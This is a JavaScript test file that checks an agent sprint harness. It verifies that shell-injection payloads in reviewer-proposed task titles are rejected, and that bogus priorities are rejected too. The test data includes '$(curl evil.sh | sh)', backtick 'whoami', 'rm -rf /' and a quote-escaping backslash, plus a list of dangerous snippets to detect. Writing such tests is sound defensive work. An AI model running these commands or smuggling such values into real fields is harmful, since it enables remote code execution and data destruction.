import { test } from 'node:test';
import assert from 'node:assert/strict';
import { runDevelopLoopScenario, withScenarioMarkers } from './helpers/mock-sprint-harness.mjs';

const check = (cond, msg) => assert.ok(cond, msg);

// =============================================================================
// apra-fleet-unw2.3 (N3): reviewer-authored newTasks containing shell-
// injection-style payloads ($(...), backticks, a trailing backslash) and
// a bogus priority must be REJECTED before ever reaching `command()` --
// and rejection must be non-fatal (the sprint completes normally).
//
// apra-fleet-eft.56.1: `title` is still interpolated inline into the `bd
// create "..."` command string, so shell-injection-style payloads in TITLE
// are still rejected. `description` is no longer shell-interpolated at all
// (it's written to a local temp file and passed via `bd create
// --body-file`), so a description containing the same dangerous-looking
// text is now legitimately ACCEPTED -- the payload lands only in the body
// file, never in a dispatched command() string.
// =============================================================================
test('mock sprint: malicious reviewer newTasks are rejected without aborting the sprint', async () => {
    await withScenarioMarkers('injection (malicious newTasks)', async () => {
        console.log('Running mock sprint scenario (malicious reviewer newTasks are rejected, sprint continues)...');
        const injection = await runDevelopLoopScenario('injection', {
            members: ['local'],
            taskSpecs: [
                { title: 'Task: Injection target' },
            ],
            reviewerHandler: async ({ reviewRound: rRound }) => {
                if (rRound === 1) {
                    return {
                        content: [{
                            text: JSON.stringify({
                                verdict: 'APPROVED',
                                notes: 'Approved, but flagging follow-up work.',
                                reopenIds: [],
                                newTasks: [
                                    // $(...) command substitution in the title.
                                    { title: 'Fix auth $(curl evil.sh | sh)', description: 'Safe description.', priority: 'P2' },
                                    // Backtick command substitution in the title.
                                    { title: 'Run `whoami` and report', description: 'Safe description.', priority: 'P1' },
                                    // Trailing backslash (closing-quote-escape trick) in the title.
                                    { title: 'Looks safe but ends in backslash\\', description: 'Safe description.', priority: 'P3' },
                                    // Bogus priority values (typed field must be P0-P4 exactly).
                                    { title: 'Safe title two', description: 'Safe description two.', priority: 'urgent' },
                                    { title: 'Safe title three', description: 'Safe description three.', priority: 'P99' },
                                    { title: 'Safe title four', description: 'Safe description four.', priority: '' },
                                    // One genuinely safe newTask, to prove the allowlist
                                    // is not just rejecting everything.
                                    { title: 'Add retry logic for 401s', description: 'Per review notes: add up to 3 retries.', priority: 'P2' },
                                    // apra-fleet-eft.56.1: a dangerous-looking DESCRIPTION
                                    // (backtick + $(...)) with a SAFE title must now be
                                    // ACCEPTED and created -- description is no longer
                                    // shell-interpolated, so this is no longer an injection
                                    // risk, and legitimate technical findings must not be
                                    // silently dropped.
                                    { title: 'Description has dangerous-looking chars', description: 'Do the thing `rm -rf /` via $(curl evil.sh | sh) after merge.', priority: 'P1' },
                                ],
                            })
                        }]
                    };
                }
                return { content: [{ text: JSON.stringify({ verdict: 'APPROVED', notes: 'Nothing further.', reopenIds: [], newTasks: [] }) }] };
            },
        });
        check(!injection.error, `Injection scenario should not error (rejection must be non-fatal): ${injection.error ? injection.error.message : ''}`);
        check(
            injection.result && (injection.result.status === 'success' || injection.result.status === 'failed'),
            `Injection scenario should still resolve to a real final result (sprint continued), got: ${JSON.stringify(injection.result)}`
        );
        const DANGEROUS_SNIPPETS = ['$(curl', '`rm -rf /`', 'backslash\\"'];
        for (const cmd of injection.commandLog) {
            for (const snippet of DANGEROUS_SNIPPETS) {
                check(
                    !cmd.includes(snippet),
                    `Dangerous payload '${snippet}' must never reach command() (found in: ${cmd})`
                );
            }
            check(!cmd.includes('$('), `No dispatched command should ever contain '$(' (found in: ${cmd})`);
            check(!/`/.test(cmd), `No dispatched command should ever contain a backtick (found in: ${cmd})`);
        }
        check(
            !injection.commandLog.some((c) => c.startsWith('bd create') && c.includes('-p "urgent"')),
            `A bogus priority 'urgent' must never reach a dispatched bd create command, commandLog: ${JSON.stringify(injection.commandLog)}`
        );
        check(
            !injection.commandLog.some((c) => c.startsWith('bd create') && c.includes('-p "P99"')),
            `A bogus priority 'P99' must never reach a dispatched bd create command, commandLog: ${JSON.stringify(injection.commandLog)}`
        );
        check(
            injection.commandLog.some((c) => c.startsWith('bd create') && c.includes('Add retry logic for 401s')),
            `Expected the one genuinely safe newTask to still be created via bd create, commandLog: ${JSON.stringify(injection.commandLog)}`
        );
        // apra-fleet-eft.56.1: the dangerous-looking-DESCRIPTION newTask must
        // now be created too (safe title, and description is no longer
        // shell-interpolated) -- via `--body-file`, never `-d "..."` with the
        // raw description inline.
        check(
            injection.commandLog.some((c) => c.startsWith('bd create') && c.includes('Description has dangerous-looking chars') && c.includes('--body-file')),
            `Expected the dangerous-looking-description newTask to still be created via bd create --body-file, commandLog: ${JSON.stringify(injection.commandLog)}`
        );
        check(
            injection.logs.filter((m) => m.includes('REJECTED (not sent to bd create)')).length >= 6,
            `Expected at least 6 "REJECTED (not sent to bd create)" log lines (one per unsafe newTask), logs: ${JSON.stringify(injection.logs)}`
        );
    });
});
